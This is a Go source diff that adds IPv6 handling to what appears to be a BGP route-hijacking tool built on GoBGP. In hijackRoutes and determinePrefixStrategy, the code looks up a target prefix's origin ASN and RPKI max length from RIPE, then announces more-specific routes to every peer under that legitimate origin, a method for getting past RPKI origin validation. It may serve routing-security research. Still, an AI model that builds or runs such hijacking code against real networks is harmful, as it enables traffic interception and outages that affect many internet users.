@@ -156,6 +156,12 @@ func createCommunityAttributes() ([]*anypb.Any, error) {
 }
 
 func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string, asn ...uint32) error {
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(prefix)
+	if parsedIP == nil {
+		return fmt.Errorf("invalid IP address: %s", prefix)
+	}
+
 	// Create NLRI
 	nlri, err := anypb.New(&api.IPAddressPrefix{
 		Prefix:    prefix,
@@ -208,11 +214,22 @@ func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, pre
 	}
 	pattrs = append(pattrs, communityAttrs...)
 
-	path := &api.Path{
-		Family: &api.Family{
+	// Set the appropriate family based on IP version
+	var family *api.Family
+	if parsedIP.To4() == nil {
+		family = &api.Family{
+			Afi:  api.Family_AFI_IP6,
+			Safi: api.Family_SAFI_UNICAST,
+		}
+	} else {
+		family = &api.Family{
 			Afi:  api.Family_AFI_IP,
 			Safi: api.Family_SAFI_UNICAST,
-		},
+		}
+	}
+
+	path := &api.Path{
+		Family: family,
 		Nlri:   nlri,
 		Pattrs: pattrs,
 	}
@@ -291,37 +308,74 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 }
 
 func determinePrefixStrategy(ip string) (uint32, uint32, error) {
-	// Check if it's an IPv4 address
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return 0, 0, fmt.Errorf("invalid IP address: %s", ip)
+	}
+
+	isIPv6 := parsedIP.To4() == nil
+	// Check if it's an IPv4 or IPv6 address
 	prefixLen, asns, err := ripe.GetCurrentPrefixInfoFromRipe(ip)
 
 	var strategyAsn uint32
 	var strategyLen uint32
-	if prefixLen < 24 {
-		fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
-		// Check RPKI validation for each ASN
-		prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
-		for _, asn := range asns {
-			maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
-			if err != nil {
-				fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
-				continue
-			}
-
-			for i := prefixLen; i <= maxRpkiLength; i++ {
-				prefix := fmt.Sprintf("%s/%d", ip, i)
-				np, err := utils.NormalizePrefix(prefix)
+	if isIPv6 {
+		if prefixLen < 48 {
+			fmt.Println("Current announcement is less than 48, more specific announcement is possible to be used")
+			// Check RPKI validation for each ASN
+			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
+			for _, asn := range asns {
+				maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
 				if err != nil {
-					log.Fatal(err)
+					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
+					continue
 				}
-				fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+
+				for i := prefixLen; i <= maxRpkiLength; i++ {
+					prefix := fmt.Sprintf("%s/%d", ip, i)
+					np, err := utils.NormalizePrefix(prefix)
+					if err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+				}
+				strategyLen = maxRpkiLength
+				strategyAsn = asn
 			}
-			strategyLen = maxRpkiLength
-			strategyAsn = asn
+		} else {
+			fmt.Printf("[DEBUG] Current announcement is 48\n")
+			strategyAsn = asns[0]
+			strategyLen = prefixLen
 		}
 	} else {
-		fmt.Printf("[DEBUG] Current announcement is 24\n")
-		strategyAsn = asns[0]
-		strategyLen = prefixLen
+		if prefixLen < 24 {
+			fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
+			// Check RPKI validation for each ASN
+			prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
+			for _, asn := range asns {
+				maxRpkiLength, err := ripe.GetCurrentRpkiInfoFromRipe(prefix, asn)
+				if err != nil {
+					fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
+					continue
+				}
+
+				for i := prefixLen; i <= maxRpkiLength; i++ {
+					prefix := fmt.Sprintf("%s/%d", ip, i)
+					np, err := utils.NormalizePrefix(prefix)
+					if err != nil {
+						log.Fatal(err)
+					}
+					fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
+				}
+				strategyLen = maxRpkiLength
+				strategyAsn = asn
+			}
+		} else {
+			fmt.Printf("[DEBUG] Current announcement is 24\n")
+			strategyAsn = asns[0]
+			strategyLen = prefixLen
+		}
 	}
 
 	return strategyLen, strategyAsn, err
@@ -332,6 +386,12 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 	// hijackRoutes(client, ctx, "192.168.1.0", false)
 	// Using a specific prefix length
 	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
+	// Parse the IP to determine if it's IPv4 or IPv6
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return fmt.Errorf("invalid IP address: %s", ip)
+	}
+	isIPv6 := parsedIP.To4() == nil
 
 	// Get BGP neighbors
 	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
@@ -358,6 +418,24 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		if err != nil {
 			break
 		}
+
+		// Check if peer is IPv4 or IPv6
+		peerIP := net.ParseIP(peer.Peer.Conf.NeighborAddress)
+		if peerIP == nil {
+			fmt.Printf("[WARN] Skipping peer with invalid IP address: %s\n", peer.Peer.Conf.NeighborAddress)
+			continue
+		}
+		isPeerIPv6 := peerIP.To4() == nil
+
+		// Skip if IP version doesn't match peer version
+		if isIPv6 != isPeerIPv6 {
+			fmt.Printf("- Skipping %s peer %s (AS: %d) - IP version mismatch\n",
+				map[bool]string{true: "IPv6", false: "IPv4"}[isPeerIPv6],
+				peer.Peer.Conf.NeighborAddress,
+				peer.Peer.Conf.PeerAsn)
+			continue
+		}
+
 		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
 			peer.Peer.Conf.NeighborAddress,
 			peer.Peer.Conf.PeerAsn,
@@ -369,7 +447,8 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		}
 
 		if dryrun {
-			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n",
+			fmt.Printf("[DRYRUN] Would add %s route %s with origin %d\n",
+				map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
 				np, asn)
 			continue
 		}
@@ -380,7 +459,8 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
 
-		fmt.Printf("Route added successfully to %s (%s)\n",
+		fmt.Printf("%s route added successfully to %s (%s)\n",
+			map[bool]string{true: "IPv6", false: "IPv4"}[isIPv6],
 			peer.Peer.Conf.NeighborAddress, np)
 	}
 
